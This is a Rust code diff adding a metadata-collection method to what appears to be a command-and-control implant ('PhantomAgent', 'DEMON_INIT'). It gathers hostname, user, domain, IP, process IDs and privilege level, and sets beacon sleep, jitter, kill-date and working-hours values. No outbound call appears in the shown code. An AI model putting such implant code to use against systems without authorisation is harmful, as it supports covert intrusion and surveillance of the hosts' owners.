@@ -113,6 +113,41 @@ pub(crate) fn is_elevated() -> bool {
     }) == Some(0)
 }
 
+use super::PhantomAgent;
+use crate::protocol::AgentMetadata;
+
+impl PhantomAgent {
+    /// Collect Linux host metadata for `DEMON_INIT`.
+    pub fn collect_metadata(&self) -> AgentMetadata {
+        let (os_major, os_minor, os_build) = kernel_version();
+        AgentMetadata {
+            hostname: read_trimmed("/etc/hostname").unwrap_or_else(|| String::from("unknown")),
+            username: std::env::var("USER").unwrap_or_else(|_| String::from("unknown")),
+            domain_name: domain_name(),
+            internal_ip: local_ip(),
+            process_path: std::env::current_exe()
+                .map(|path| path.display().to_string())
+                .unwrap_or_default(),
+            process_pid: std::process::id(),
+            process_tid: thread_id(),
+            process_ppid: parent_pid(),
+            process_arch: if cfg!(target_arch = "x86_64") { 2 } else { 1 },
+            elevated: is_elevated(),
+            base_address: base_address(),
+            os_major,
+            os_minor,
+            os_product_type: 1,
+            os_service_pack: 0,
+            os_build,
+            os_arch: if cfg!(target_arch = "x86_64") { 9 } else { 0 },
+            sleep_delay: (self.config.sleep_delay_ms + 500) / 1000,
+            sleep_jitter: self.config.sleep_jitter,
+            kill_date: self.config.kill_date.unwrap_or_default().max(0) as u64,
+            working_hours: self.config.working_hours.unwrap_or(0),
+        }
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
